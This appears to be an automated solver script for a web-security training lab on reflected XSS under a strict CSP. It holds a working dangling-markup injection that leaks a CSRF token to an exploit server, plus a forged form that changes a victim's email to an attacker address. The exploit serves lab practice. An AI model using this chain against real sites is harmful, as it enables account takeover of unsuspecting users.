const {
  getExploitServerUrl,
  labLogin,
  runLab,
  storeExploit,
  waitForSolved,
} = require('./_common.cjs');

const TITLE = 'Reflected XSS protected by very strict CSP, with dangling markup attack';
const PATH = '/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack';

runLab({
  title: TITLE,
  path: PATH,
  solve: async ({ page, labUrl }) => {
    await labLogin(page, labUrl, 'wiener', 'peter');
    const exploitUrl = await getExploitServerUrl(page, labUrl);

    const clickVector = `${labUrl}/my-account?email=${encodeURIComponent(`foo@bar.net"><button class="button" formaction="${exploitUrl}" formmethod="get" type="submit">Click me</button>`)}`;
    const exploitBody = `<body><script>
const csrf = new URL(location).searchParams.get('csrf');
if (csrf) {
  const form = document.createElement('form');
  form.method = 'POST';
  form.action = '${labUrl}/my-account/change-email';
  const email = document.createElement('input');
  email.name = 'email';
  email.value = 'hacker@evil-user.net';
  const token = document.createElement('input');
  token.name = 'csrf';
  token.value = csrf;
  form.append(email, token);
  document.body.append(form);
  form.submit();
} else {
  location = '${clickVector.replace(/'/g, '%27')}';
}
</script></body>`;

    await storeExploit(page, exploitUrl, exploitBody, true);

    const solved = await waitForSolved(page, labUrl, 45000, 3000);
    if (!solved) {
      throw new Error('Victim email change exploit did not solve the lab');
    }
  },
});
